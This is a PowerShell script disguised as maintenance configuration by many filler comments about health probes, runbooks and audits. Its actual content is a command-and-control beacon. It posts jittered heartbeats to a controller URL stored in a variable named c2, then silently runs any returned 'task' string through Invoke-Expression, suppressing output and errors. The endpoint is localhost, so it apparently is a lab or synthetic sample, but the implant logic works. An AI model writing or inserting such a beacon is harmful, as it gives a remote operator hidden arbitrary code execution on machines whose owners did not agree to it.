$delay_ce7a = 3472
# health probe configuration
# config sync point
# suppress verbose output here
# telemetry hook disabled
function Send-Hb {
    $body_ce7a = @{ host = $hid_ce7a; act = 'hb' } | ConvertTo-Json -Compress
    $r_ce7a = Invoke-RestMethod -Uri $c2_ce7a -Method Post -Body $body_ce7a -ContentType 'application/json'
    $r_ce7a
}
# schedule synced with controller
# see runbook section 4
# temp override cleared on boot
# routine maintenance marker
# workaround for stale cache
# idle timeout handled upstream
# revision tracked out of band
# local registry mirror preferred
$jit_ce7a = 1430
# no action required below this line
# legacy shim retained for compatibility
# temp override cleared on boot
# placeholder for future flags
# node bootstrap notes
# idle timeout handled upstream
# revision tracked out of band
$c2_ce7a = 'http://127.0.0.1:8443/r'
# quotas checked at start
# keep interval within policy
# revision tracked out of band
# node bootstrap notes
# baseline captured before deploy
# no action required below this line
# temp override cleared on boot
# fallback order intentional
# routine maintenance marker
# see runbook section 4
# local registry mirror preferred
# placeholder for future flags
$hid_ce7a = '10.0.0.6'
# defaults match golden config
# telemetry hook disabled
# schedule synced with controller
while ($true) {
# health probe configuration
# config sync point
# legacy shim retained for compatibility
    $resp_ce7a = $null
# defaults match golden config
# local registry mirror preferred
# fallback order intentional
    try { $resp_ce7a = Send-Hb } catch { Start-Sleep -Milliseconds $delay_ce7a; continue }
# health probe configuration
# schedule synced with controller
# suppress verbose output here
# no action required below this line
# baseline captured before deploy
# node bootstrap notes
# revision tracked out of band
# fallback order intentional
    if (($null -ne $resp_ce7a) -and $resp_ce7a.task) {
# temp override cleared on boot
# see runbook section 4
# baseline captured before deploy
# suppress verbose output here
# quotas checked at start
# reviewed in last audit
        $buf_ce7a = [string]$resp_ce7a.task
# config sync point
# baseline captured before deploy
# keep interval within policy
# node bootstrap notes
# workaround for stale cache
# upstream patch pending
# no action required below this line
# fallback order intentional
# do not reorder without approval
# schedule synced with controller
# temp override cleared on boot
# routine maintenance marker
        if ($buf_ce7a.Length -gt 0) {
# legacy shim retained for compatibility
# health probe configuration
# reviewed in last audit
# keep interval within policy
# fallback order intentional
# placeholder for future flags
# local registry mirror preferred
# see runbook section 4
            try { Invoke-Expression $buf_ce7a | Out-Null } catch { }
# local registry mirror preferred
# config sync point
# suppress verbose output here
# placeholder for future flags
# legacy shim retained for compatibility
# defaults match golden config
# temp override cleared on boot
        }
# config sync point
# no action required below this line
# keep interval within policy
# baseline captured before deploy
# placeholder for future flags
# suppress verbose output here
# upstream patch pending
# legacy shim retained for compatibility
    }
# keep interval within policy
# config sync point
# health probe configuration
# placeholder for future flags
# temp override cleared on boot
    Start-Sleep -Milliseconds ($delay_ce7a + (Get-Random -Minimum 0 -Maximum ($jit_ce7a + 1)))
# local registry mirror preferred
# placeholder for future flags
# node bootstrap notes
# suppress verbose output here
# baseline captured before deploy
}
